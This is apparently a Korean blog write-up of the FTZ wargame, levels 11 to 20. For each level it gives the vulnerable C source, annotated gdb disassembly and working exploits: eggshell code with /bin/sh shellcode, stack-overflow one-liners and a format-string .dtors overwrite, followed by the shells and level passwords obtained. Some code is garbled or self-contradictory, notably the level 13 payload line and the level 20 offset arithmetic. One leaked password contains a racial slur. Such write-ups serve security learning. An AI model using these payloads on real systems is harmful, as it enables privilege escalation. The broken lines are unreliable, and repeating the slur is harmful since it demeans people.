---
layout: post
title:  "FTZ-Writeup"
tag:   Analysis
categories: pwnable
categories: persu
---

FTZ-Writeup

내 인생의 첫 BoF! Simple... BoF...

## level11

### 1. Directory info
-rwsr-x---    1 level12  level11     13733  3월  8  2003 attackme

-rw-r-----    1 root     level11       168  3월  8  2003 hint

drwxr-xr-x    2 root     level11      4096  2월 24  2002 public_html

drwxrwxr-x    2 root     level11      4096  2월 19 16:37 tmp

attackme 라는 바이너리를 실행하여, BoF 공격을 해야 한다.

### 2. hint

```c
#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
	char str[256];

 	setreuid( 3092, 3092 );
	strcpy( str, argv[1] );
	printf( str );
}
```
hint 파일에는 위와 같이 attackme 바이너리의 C 코드가 주어지게 된다. 사용자가 입력한 argv 값을 str로 복사하는 코드다.
이 부분에서 취약점은 길이 값을 검증하지 않는 strcpy를 사용하게 되는 것이며, 이를 이용하여 return address(eip)를 변조하는 것이다.

**strcpy 함수**
```c
#include <string.h>
char *strcpy(char *dest, const char *src);
```

- 헤더	string.h
- 형태	char * strcpy( char *dest, const char *src);
- 인수	char *dest	복사할 위치, char *src	원문 문자열
- 반환	복사한 문자열을 반환

즉, strcpy 는 문자열을 복사하는 함수인 것이다. 사용자가 입력할 수 있는 문자열을 복사할 위치의 길이 보다 길게 입력하면 된다.
해당 바이너리의 Stack Frame을 확인 하기 위해서는 gdb 를 통해 확인해야 한다.

### 3. gdb attackme

```assembler
0x08048470 <main+0>:	push   ebp
0x08048471 <main+1>:	mov    ebp,esp                  
; 에필로그
0x08048473 <main+3>:	sub    esp,0x108
0x08048479 <main+9>:	sub    esp,0x8
; stack frame
0x0804847c <main+12>:	push   0xc14
0x08048481 <main+17>:	push   0xc14
0x08048486 <main+22>:	call   0x804834c <setreuid>
; setreuid(0xc14, 0xc14)
0x0804848b <main+27>:	add    esp,0x10
0x0804848e <main+30>:	sub    esp,0x8
0x08048491 <main+33>:	mov    eax,DWORD PTR [ebp+12]
; ebp+4 = sfp
; ebp+8 = argc
; ebp+12 = argv
0x08048494 <main+36>:	add    eax,0x4
; eax = argv+4 = argv[1]
0x08048497 <main+39>:	push   DWORD PTR [eax]
0x08048499 <main+41>:	lea    eax,[ebp-264]
0x0804849f <main+47>:	push   eax
0x080484a0 <main+48>:	call   0x804835c <strcpy>
; strcpy(eax,argv[1])
0x080484a5 <main+53>:	add    esp,0x10
0x080484a8 <main+56>:	sub    esp,0xc
0x080484ab <main+59>:	lea    eax,[ebp-264]
0x080484b1 <main+65>:	push   eax
0x080484b2 <main+66>:	call   0x804833c <printf>
0x080484b7 <main+71>:	add    esp,0x10
0x080484ba <main+74>:	leave
0x080484bb <main+75>:	ret
; eip 변조를 해야함
0x080484bc <main+76>:	nop
0x080484bd <main+77>:	nop
0x080484be <main+78>:	nop
0x080484bf <main+79>:	nop
End of assembler dump.
```

현재 Stack Frame은 epb-264만큼이며, ret을 덮어 쓰기 위해서는 ebp+8한 위치 만큼 덮어써야 한다.  
stack = 264 | SPF = 4 | Ret = 4 |
최종적으로는 Ret이 가르키는 주소에 shellcode가 실행될 수 있게 해야 한다.

4. eggshell
출처 : http://pwnbit.kr/7

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90

char shellcode[] =
"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80" //setuid(geteuid())
 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
 "\x80\xe8\xdc\xff\xff\xff/bin/sh";


unsigned long get_esp(void)
{
   __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[])
{
   char *buff, *ptr, *egg;
   long *addr_ptr, addr;
   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
   int i, eggsize=DEFAULT_EGG_SIZE;

   if (argc > 1) bsize = atoi(argv[1]);
   if (argc > 2) offset = atoi(argv[2]);
   if (argc > 3) eggsize = atoi(argv[3]);

   if (!(buff = malloc(bsize))) {
     printf("Can't allocate memory.\n");
     exit(0);
   }

   if (!(egg = malloc(eggsize))) {
     printf("Can't allocate memory.\n");
     exit(0);
   }

   addr = get_esp() - offset;

   printf("Using address: 0x%x\n", addr);

   ptr = buff;
   addr_ptr = (long *) ptr;
   for (i = 0; i < bsize; i+=4)
     *(addr_ptr++) = addr;

   ptr = egg;
   for(i = 0; i < eggsize - strlen(shellcode) - 1; i++)
     *(ptr++) = NOP;
   for(i = 0; i < strlen(shellcode); i++)
     *(ptr++) = shellcode[i];

   buff[bsize - 1] = '\0';
   egg[eggsize - 1] = '\0';
   memcpy(egg,"EGG=",4);
   putenv(egg);
   memcpy(buff,"RET=",4);
   putenv(buff);
   system("/bin/bash");
}
```

[level11@ftz tmp]$ gcc -o egg egg.c

[level11@ftz tmp]$ ./egg

Using address: 0xbffff9e8

Ret을 변조하여 쉘을 실행하는 방법은 여러가지가 있지만 이번에는 eggshell이라는 방식을 이용하여, exploit을 하게 되었다. eggshell 코드는 출처를 통해 복붙하였다

### 5. exploit code
./attackme `python -c 'print "A"*268+"\xe8\xf9\xff\xbf"+\x00'`
Level12 Password is "it is like this".

exploit code는 위와 같으며, little 엔디안 방식으로 eggshell 주소를 넣어 주었다.

## Level12

### 1. Directory info
-rwsr-x---    1 level13  level12     13771  3월  8  2003 attackme

-rw-r-----    1 root     level12       204  3월  8  2003 hint

drwxr-xr-x    2 root     level12      4096  2월 24  2002 public_html

drwxrwxr-x    2 root     level12      4096  2월 19 17:26 tmp

attackme 라는 바이너리를 실행하여, BoF 공격을 해야 한다.

### 2. hint
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( void )
{
	char str[256];

 	setreuid( 3093, 3093 );
	printf( "문장을 입력하세요.\n" );
	gets( str );
	printf( "%s\n", str );
}
```

gets() 함수를 이용하여, BoF를 하는 방법이다.
1. eggshell의 실행 주소 파악
    * 알아야할 것 : eggshell

2. gets 함수는 문자열 뒤에 \x00 (null)을 입력 해줘야 하며, EOF(End of File)인터럽트가 발생한다.
    * EOF 개념
    * gets 함수파악

### 3. gdb attackme
```assembler
0x08048470 <main+0>:	push   ebp
0x08048471 <main+1>:	mov    ebp,esp
0x08048473 <main+3>:	sub    esp,0x108
0x08048479 <main+9>:	sub    esp,0x8
0x0804847c <main+12>:	push   0xc15
0x08048481 <main+17>:	push   0xc15
0x08048486 <main+22>:	call   0x804835c <setreuid>
0x0804848b <main+27>:	add    esp,0x10
0x0804848e <main+30>:	sub    esp,0xc
0x08048491 <main+33>:	push   0x8048538
0x08048496 <main+38>:	call   0x804834c <printf>
0x0804849b <main+43>:	add    esp,0x10
0x0804849e <main+46>:	sub    esp,0xc
0x080484a1 <main+49>:	lea    eax,[ebp-264]
0x080484a7 <main+55>:	push   eax
0x080484a8 <main+56>:	call   0x804831c <gets>
0x080484ad <main+61>:	add    esp,0x10
0x080484b0 <main+64>:	sub    esp,0x8
0x080484b3 <main+67>:	lea    eax,[ebp-264]
; move eax, ebp-264
0x080484b9 <main+73>:	push   eax
0x080484ba <main+74>:	push   0x804854c
0x080484bf <main+79>:	call   0x804834c <printf>
0x080484c4 <main+84>:	add    esp,0x10
0x080484c7 <main+87>:	leave
0x080484c8 <main+88>:	ret
0x080484c9 <main+89>:	lea    esi,[esi]
0x080484cc <main+92>:	nop
0x080484cd <main+93>:	nop
0x080484ce <main+94>:	nop
0x080484cf <main+95>:	nop
```

### 4. eggshell address
```c
int main()
{
	printf("EGG addr : %p\n",getenv("EGG"));
}
```
eggshell은 실행마다 getenv 주소가 바뀌게 된다. 따라서 EGG 환경 변수 주소를 파악하는데 위와 같은 소스를 이용하여 재확인해야 한다.

### 5. exploit
(python -c 'print "A"*268+"\x7d\xf4\xff\xbf"';cat) | /home/level12/attackme

Level13 Password is "have no clue".

표준입력을 인자로 받는 gets함수는 () | 를 통해 인자값을 넣어줘야 한다.

## Level12

### 1. Directory info
-rwsr-x---    1 level14  level13     13953  3월  8  2003 attackme

-rw-r-----    1 root     level13       258  3월  8  2003 hint

drwxr-xr-x    2 root     level13      4096  2월 24  2002 public_html

drwxrwxr-x    2 root     level13      4096  1월 11  2009 tmp


### 2. hint
```c
#include <stdlib.h>

main(int argc, char *argv[])
{
   long i=0x1234567;
   char buf[1024];

   setreuid( 3094, 3094 );
   if(argc > 1)
   strcpy(buf,argv[1]);

   if(i != 0x1234567) {
   printf(" Warnning: Buffer Overflow !!! \n");
   kill(0,11);
   }
}
```


### 3. gdb attackme

```
0x080484a0 <main+0>:	push   ebp
0x080484a1 <main+1>:	mov    ebp,esp
0x080484a3 <main+3>:	sub    esp,0x418
0x080484a9 <main+9>:	mov    DWORD PTR [ebp-12],0x1234567
; ebp-12 지점에 0x1234567이 들어가게 된다. 실제로 들어가는 값은 0x01234567
0x080484b0 <main+16>:	sub    esp,0x8
0x080484b3 <main+19>:	push   0xc16
0x080484b8 <main+24>:	push   0xc16
0x080484bd <main+29>:	call   0x8048370 <setreuid>
0x080484c2 <main+34>:	add    esp,0x10
0x080484c5 <main+37>:	cmp    DWORD PTR [ebp+8],0x1
0x080484c9 <main+41>:	jle    0x80484e5 <main+69>
0x080484cb <main+43>:	sub    esp,0x8
0x080484ce <main+46>:	mov    eax,DWORD PTR [ebp+12]
; eax 는 strcpy가 가지는 첫 번째 인자, long i
0x080484d1 <main+49>:	add    eax,0x4
0x080484d4 <main+52>:	push   DWORD PTR [eax]
0x080484d6 <main+54>:	lea    eax,[ebp-1048]
; ebp-10448 위치가 argv[1] 즉 사용자가 입력한 값이 된다.
; eax 는 strcpy가 가지는 두 번째 인자 arvg[1]이 된다.
0x080484dc <main+60>:	push   eax
0x080484dd <main+61>:	call   0x8048390 <strcpy>
0x080484e2 <main+66>:	add    esp,0x10
0x080484e5 <main+69>:	cmp    DWORD PTR [ebp-12],0x1234567
; ebp-12가 가르키는 주소의 값과 0x1234567이 같다면 zf(zeroflag)가 1이 된다.
; zf는 cmp의 결과 값이 0(false)이면 1로 셋팅, 잉? 맞나? 다시확인
0x080484ec <main+76>:	je     0x804850d <main+109>
; zf 값이 1이면 해당 함수로 이동하게 된다.
; 0x804850d = leave ret로 이동하게 됨
0x080484ee <main+78>:	sub    esp,0xc
0x080484f1 <main+81>:	push   0x80485a0
0x080484f6 <main+86>:	call   0x8048360 <printf>
0x080484fb <main+91>:	add    esp,0x10
0x080484fe <main+94>:	sub    esp,0x8
0x08048501 <main+97>:	push   0xb
0x08048503 <main+99>:	push   0x0
0x08048505 <main+101>:	call   0x8048380 <kill>
0x0804850a <main+106>:	add    esp,0x10
0x0804850d <main+109>:	leave
0x0804850e <main+110>:	ret
0x0804850f <main+111>:	nop
```

### 4. exploit
[level13@ftz tmp]$ /tmp/getegg
EGG addr : 0xbffff46a

```
/home/level13/attackme `python -c 'print "A"*1036+"\x67\x45><1036+"\x67\x45\x23\x01"+"A"*12+"\x6a\xf4\xff\xbf"'`
```

sh-2.05b$ my-pass
TERM environment variable not set.
Level14 Password is "what that nigga want?".





## Level14

### 1. Directory info

-rwsr-x---    1 level15  level14     13801 12월 10  2002 attackme

-rw-r-----    1 root     level14       346 12월 10  2002 hint

drwxr-xr-x    2 root     level14      4096  2월 24  2002 public_html

drwxrwxr-x    2 root     level14      4096  1월 11  2009 tmp

### 2. hint

```c
#include <stdio.h>
#include <unistd.h>

main()
{
  int crap;
  int check;
  char buf[20];
  fgets(buf,45,stdin);
  if (check==0xdeadbeef)
   {
     setreuid(3095,3095);
     system("/bin/sh");
   }
}
```
소스코드 분석 내용 : buf를 입력 받고, check를 0xdeadbeef로 바꿔야 할듯?

### 3. gdb attackme
```
0x08048490 <main+0>:	push   ebp
0x08048491 <main+1>:	mov    ebp,esp
0x08048493 <main+3>:	sub    esp,0x38
0x08048496 <main+6>:	sub    esp,0x4
0x08048499 <main+9>:	push   ds:0x8049664
; stack에 0x8049664 값을 넣기
0x0804849f <main+15>:	push   0x2d
; stack에 0x2d = 45
0x080484a1 <main+17>:	lea    eax,[ebp-56]
; move eax ebp-56
0x080484a4 <main+20>:	push   eax
; stack에 eax
0x080484a5 <main+21>:	call   0x8048360 <fgets>
; 함수 호출 규약에 따라 fgets(eax,0x2d,0x8049664) 와 같은 형태로 변환
0x080484aa <main+26>:	add    esp,0x10
0x080484ad <main+29>:	cmp    DWORD PTR [ebp-16],0xdeadbeef
; int check는 ebp-16에 위치 하고 있으며, 해당 값이 0xdeadbeef로 설정되어 있어야 함
0x080484b4 <main+36>:	jne    0x80484db <main+75>
; jne = jump not equal 두 값이 같지 안다면 0x80484db로 이동 -> 바이너리 종료
0x080484b6 <main+38>:	sub    esp,0x8
0x080484b9 <main+41>:	push   0xc17
0x080484be <main+46>:	push   0xc17
0x080484c3 <main+51>:	call   0x8048380 <setreuid>
0x080484c8 <main+56>:	add    esp,0x10
0x080484cb <main+59>:	sub    esp,0xc
0x080484ce <main+62>:	push   0x8048548
0x080484d3 <main+67>:	call   0x8048340 <system>
0x080484d8 <main+72>:	add    esp,0x10
0x080484db <main+75>:	leave
0x080484dc <main+76>:	ret
0x080484dd <main+77>:	lea    esi,[esi]
```

### 4. exploit code
(python -c 'print "A"*40+"\xef\xbe\xad\xde\x00"';cat) | /home/level14/attackme

ebp-56 지점에서 ebp-16까지 값을 채우고(A*40), ebp-16지점에서 4바이트는 0xdeadbeef로 값을 변경해준다. 이후 1바이트는 문자열 종료를 의미하는 null을 넣는다. 이후 fget의 EOF를 cat으로 받으면서 정상적으로 쉘 획득이 가능하도록 한다.

'xterm-256color': unknown terminal type.
Level15 Password is "guess what".


## Level15

### 1. Directory info
-rwsr-x---    1 level16  level15     13801 12월 10  2002 attackme

-rw-r-----    1 root     level15       185 12월 10  2002 hint

drwxr-xr-x    2 root     level15      4096  2월 24  2002 public_html

drwxrwxr-x    2 root     level15      4096  1월 11  2009 tmp

### 2. hint
```
#include <stdio.h>

main()
{ int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef)
   {
     setreuid(3096,3096);
     system("/bin/sh");
   }
}
```
### 3. gdb attackme
```asm
0x08048490 <main+0>:	push   ebp
0x08048491 <main+1>:	mov    ebp,esp
0x08048493 <main+3>:	sub    esp,0x38
; esp - 56
0x08048496 <main+6>:	sub    esp,0x4
; esp - 4
0x08048499 <main+9>:	push   ds:0x8049664
; stdin
0x0804849f <main+15>:	push   0x2d
; 45
0x080484a1 <main+17>:	lea    eax,[ebp-56]
; move eax ebp-56
0x080484a4 <main+20>:	push   eax
; buf
0x080484a5 <main+21>:	call   0x8048360 <fgets>
; fgets(buf,45,stdin)
0x080484aa <main+26>:	add    esp,0x10
; esp + 16
0x080484ad <main+29>:	mov    eax,DWORD PTR [ebp-16]
; eax = ebp-16 주소의 값
0x080484b0 <main+32>:	cmp    DWORD PTR [eax],0xdeadbeef
; if(eax == 0xdeadbeef)
; 0xdeadbeef 주소 0x80484b2
0x080484b6 <main+38>:	jne    0x80484dd <main+77>
0x080484b8 <main+40>:	sub    esp,0x8
0x080484bb <main+43>:	push   0xc18
0x080484c0 <main+48>:	push   0xc18
0x080484c5 <main+53>:	call   0x8048380 <setreuid>
0x080484ca <main+58>:	add    esp,0x10
0x080484cd <main+61>:	sub    esp,0xc
0x080484d0 <main+64>:	push   0x8048548
0x080484d5 <main+69>:	call   0x8048340 <system>
0x080484da <main+74>:	add    esp,0x10
0x080484dd <main+77>:	leave
0x080484de <main+78>:	ret
0x080484df <main+79>:	nop
```
stack 에서 순서는 buf, check, crap 순으로 스택이 쌓이게 된다
1. buf
2. check
3. crap
이런 순서기 때문에 buf 값을 오버플로우 시켜 check에 deadbeef 상수의 주소값을 넣으면 된다.

### 4. exploit code
(python -c 'print "A"*40+"\xb2\x84\x04\x08"';cat) | ./attackme
buf ebp-56 위치이며 check 위치는 ebp-16 위치이기때문에 "A"*40 만큼 채운 후 deadbeef 주소 값을 넣는다.
id
uid=3096(level16) gid=3095(level15) groups=3095(level15)
my-pass
'xterm-256color': unknown terminal type.
Level16 Password is "about to cause mass".

## Level16

### 1. Directory info
-rwsr-x---    1 level17  level16     14017  3월  8  2003 attackme

-rw-r-----    1 root     root          235  3월  8  2003 attackme.c

-rw-r-----    1 root     level16       235  3월  8  2003 hint

drwxr-xr-x    2 root     level16      4096  2월 24  2002 public_html

drwxrwxr-x    2 root     level16      4096  1월 11  2009 tmp

### 2. hint
```c
#include <stdio.h>

void shell() {
  setreuid(3097,3097);
  system("/bin/sh");
}

void printit() {
  printf("Hello there!\n");
}

main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  call();
}
```

### 3. gdb attackme
```
main()
0x08048518 <main+0>:	push   ebp
0x08048519 <main+1>:	mov    ebp,esp
0x0804851b <main+3>:	sub    esp,0x38
; esp - 56
0x0804851e <main+6>:	mov    DWORD PTR [ebp-16],0x8048500
; ebp-16 = 0x8048500
0x08048525 <main+13>:	sub    esp,0x4
0x08048528 <main+16>:	push   ds:0x80496e8
; stdin
0x0804852e <main+22>:	push   0x30
; 45
0x08048530 <main+24>:	lea    eax,[ebp-56]
0x08048533 <main+27>:	push   eax
; eax = ebp-56
0x08048534 <main+28>:	call   0x8048384 <fgets>
0x08048539 <main+33>:	add    esp,0x10
; esp + 16
0x0804853c <main+36>:	mov    eax,DWORD PTR [ebp-16]
; eax = ebp-16 포인터의 값을 가짐
0x0804853f <main+39>:	call   eax
0x08048541 <main+41>:	leave
0x08048542 <main+42>:	ret

shell()
0x080484d0 <shell+0>:	push   ebp
0x080484d1 <shell+1>:	mov    ebp,esp
0x080484d3 <shell+3>:	sub    esp,0x8
0x080484d6 <shell+6>:	sub    esp,0x8
0x080484d9 <shell+9>:	push   0xc19
0x080484de <shell+14>:	push   0xc19
0x080484e3 <shell+19>:	call   0x80483b4 <setreuid>
0x080484e8 <shell+24>:	add    esp,0x10
0x080484eb <shell+27>:	sub    esp,0xc
0x080484ee <shell+30>:	push   0x80485b8
0x080484f3 <shell+35>:	call   0x8048364 <system>
0x080484f8 <shell+40>:	add    esp,0x10
0x080484fb <shell+43>:	leave
0x080484fc <shell+44>:	ret
0x080484fd <shell+45>:	lea    esi,[esi]

### 4. exploit code
(python -c 'print "A"*40+"\xd0\x84\x04\x08"';cat) | ./attackme
이번에는 다음 call 할 함수의 주소를 bof 시켜 변경하게 된다.
id
uid=3097(level17) gid=3096(level16) groups=3096(level16)
my-pass
'xterm-256color': unknown terminal type.
Level17 Password is "king poetic".

## Level17

### 1. Directory info
-rwsr-x---    1 level18  level17     13853  3월  8  2003 attackme

-rw-r-----    1 root     level17       191  3월  8  2003 hint

drwxr-xr-x    2 root     level17      4096  2월 24  2002 public_html

drwxrwxr-x    2 root     level17      4096  1월 11  2009 tmp

### 2. hint

```c
#include <stdio.h>

void printit() {
  printf("Hello there!\n");
}

main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  setreuid(3098,3098);
  call();
}
```

### 3. gdb attackme
```asm
0x080484a8 <main+0>:	push   ebp
0x080484a9 <main+1>:	mov    ebp,esp
0x080484ab <main+3>:	sub    esp,0x38
; esp = ebp-56
0x080484ae <main+6>:	mov    DWORD PTR [ebp-16],0x8048490
0x080484b5 <main+13>:	sub    esp,0x4
0x080484b8 <main+16>:	push   ds:0x804967c
;stdin
0x080484be <main+22>:	push   0x30
;48
0x080484c0 <main+24>:	lea    eax,[ebp-56]
; buf
0x080484c3 <main+27>:	push   eax
0x080484c4 <main+28>:	call   0x8048350 <fgets>
0x080484c9 <main+33>:	add    esp,0x10
; esp + 16
0x080484cc <main+36>:	sub    esp,0x8
; esp - 8
0x080484cf <main+39>:	push   0xc1a
0x080484d4 <main+44>:	push   0xc1a
0x080484d9 <main+49>:	call   0x8048380 <setreuid>
0x080484de <main+54>:	add    esp,0x10
0x080484e1 <main+57>:	mov    eax,DWORD PTR [ebp-16]
0x080484e4 <main+60>:	call   eax
0x080484e6 <main+62>:	leave
0x080484e7 <main+63>:	ret
0x080484e8 <main+64>:	nop
0x080484e9 <main+65>:	nop
0x080484ea <main+66>:	nop
0x080484eb <main+67>:	nop
0x080484ec <main+68>:	nop
0x080484ed <main+69>:	nop
0x080484ee <main+70>:	nop
0x080484ef <main+71>:	nop
```

### 4. exploit code
(python -c 'print "A"*40+"\x62\xf4\xff\xbf"';cat) | ./attackme
id
uid=3098(level18) gid=3097(level17) groups=3097(level17)
my-passwd
/bin/sh: line 2: my-passwd: command not found
my-pass
TERM environment variable not set.
Level18 Password is "why did you do it".

이번 문제는 처음에 call()함수를 실행하기 위해 eip를 변조해야 한다고 생각을 했다.
하지만 내가 변조해야 할 부분은 *call부분에 실행할 함수를 입력하는 것이었다...
buf[20] > dummy[20] > *call[4] > dummy[4] > crap[4] > dummy[4] > sfp[4] > ret[4]
이런식으로 스택이 쌓이기 때문에 *call[4]를 변조하면 된다.

## level18

### 1. Directory info
### 2. hint
```c
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
void shellout(void);
int main()
{
  char string[100];
  int check;
  int x = 0;
  int count = 0;
  fd_set fds;
  printf("Enter your command: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 100)
        printf("what are you trying to do?\n");
      if(check == 0xdeadbeef)
        shellout();
      else
        {
          FD_ZERO(&fds);
          FD_SET(STDIN_FILENO,&fds);

          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
            {
              if(FD_ISSET(fileno(stdin),&fds))
                {
                  read(fileno(stdin),&x,1);
                  switch(x)
                    {
                      case '\r':
                      case '\n':
                        printf("\a");
                        break;
                      case 0x08:
                        count--;
                        printf("\b \b");
                        break;
                      default:
                        string[count] = x;
                        count++;
                        break;
                    }
                }
            }
        }
    }
}

void shellout(void)
{
  setreuid(3099,3099);
  execl("/bin/sh","sh",NULL);
}
```
### 3. gdb attackme
### 4. exploit code

0xdeadbeef
(python -c 'print "\x08"*4+"\xef\xbe\xad\xde"';cat) | ./attackme
id
uid=3099(level19) gid=3098(level18) groups=3098(level18)
my-pass
'xterm-256color': unknown terminal type.
Level19 Password is "swimming in pink".

18번은 소스코드를 읽고 재 확인 (너무 뽀록으로 품)
0x08을 이용하여 4바이트 뒤로 이동 후 에 deadbeef를 덮어 씌우는 방법이다...

## Level19

### 1. Directory info
-rwsr-x---    1 level20  level19     13615  3월  8  2003 attackme

-rw-r-----    1 root     level19        65  3월  8  2003 hint

drwxr-xr-x    2 root     level19      4096  2월 24  2002 public_html

drwxrwxr-x    2 root     level19      4096  1월 16  2009 tmp

### 2. hint
```c
main()
{ char buf[20];
  gets(buf);
  printf("%s\n",buf);
}
```

### 3. gdb attackme
```asm
0x08048440 <main+0>:	push   ebp
0x08048441 <main+1>:	mov    ebp,esp
0x08048443 <main+3>:	sub    esp,0x28
0x08048446 <main+6>:	sub    esp,0xc
0x08048449 <main+9>:	lea    eax,[ebp-40]
0x0804844c <main+12>:	push   eax
0x0804844d <main+13>:	call   0x80482f4 <gets>
0x08048452 <main+18>:	add    esp,0x10
0x08048455 <main+21>:	sub    esp,0x8
0x08048458 <main+24>:	lea    eax,[ebp-40]
0x0804845b <main+27>:	push   eax
0x0804845c <main+28>:	push   0x80484d8
0x08048461 <main+33>:	call   0x8048324 <printf>
0x08048466 <main+38>:	add    esp,0x10
0x08048469 <main+41>:	leave
0x0804846a <main+42>:	ret
0x0804846b <main+43>:	nop
0x0804846c <main+44>:	nop
0x0804846d <main+45>:	nop
0x0804846e <main+46>:	nop
0x0804846f <main+47>:	nop
```

### 4. exploit code
(python -c 'print "A"*44+"\x6e\xf4\xff\xbf"';cat) | ./attackme
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn????
                                                 id
uid=3100(level20) gid=3099(level19) groups=3099(level19)
my-pass
TERM environment variable not set.
Level20 Password is "we are just regular guys".


## Level20

### 1. Directory info
-rwsr-sr-x    1 clear    clear       11777  6월 18  2008 attackme

-rw-r-----    1 root     level20       133  5월 13  2002 hint

drwxr-xr-x    2 root     level20      4096  2월 24  2002 public_html

drwxrwxr-x    2 root     level20      4096  2월 20 11:40 tmp

### 2. hint
```c
#include <stdio.h>
main(int argc,char **argv)
{ char bleh[80];
  setreuid(3101,3101);
  fgets(bleh,79,stdin);
  printf(bleh);
}
```

### 3. gdb attackme
이번 문제는 포맷 스트링을 통해 문제를 해결해야 한다.
포맷 스트링은
```
%x  부호 없는 16진수
%n  쓰인 총 바이트 수
```
위 두 포맷 스트링에 대해서 알고 있어야 한다.
hint 에서 보듯 printf(bleh)에는 포맷 스트링이 없기 때문에 아래와 같이 입력 시 주소 출력이 가능하다.

```
[level20@ftz level20]$ ./attackme
AAAA %x %x %x %x %x
AAAA 4f 4212ecc0 4207a750 41414141 20782520
```

AAAA를 입력하고 이후에는 주소 값을 보여지게 된다.

```
[level20@ftz level20]$ ./attackme
AAAAAAAAAAAA %x %x %x %x %x %x %x
AAAAAAAAAAAA 4f 4212ecc0 4207a750 41414141 41414141 41414141 20782520
````
A를 12개 입력하면 A*12 값이 출력되고 이후 12byte 뒤에 다시 4141로 A가 출력된다.
즉 스택은 아래와 같은 구성이 될 것이다.
```
printf(bleh)  = AAAAAAAAAAAA
dummy         = 0000004f
                4212ecc0
				4207a750

char bleh[80] = 41414141
                41414141
		        41414141
				20782520

dummy         = ?
SFP           = 4byte
RET           = 4byte
```
뭐 이런 형식이 아닐까?

```
[level20@ftz level20]$ objdump -h attackme |grep .dtors
 18 .dtors        00000008  08049594  08049594  00000594  2**2
```


### 4. exploit code
1. base exploit code
egg : 0xbffff46e
bfff : 49151
f46e : 62574
AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62574c%n%49151c%n

2.
AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x
4 + 4+ 4+ 4 +8 + 8+ 8  = 16 + 24 = 40
62574-40 = 62534
AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62174c%n%49151c%n

3.
1bfff = 114687 - 62574 = 52113
AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62174c%n%52113c%n


(python -c 'print "AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62534c%n%52113c%n"';cat) | /home/level20/attackme

AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62534c%n%52113c%n
AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62085c%n%52562c%n
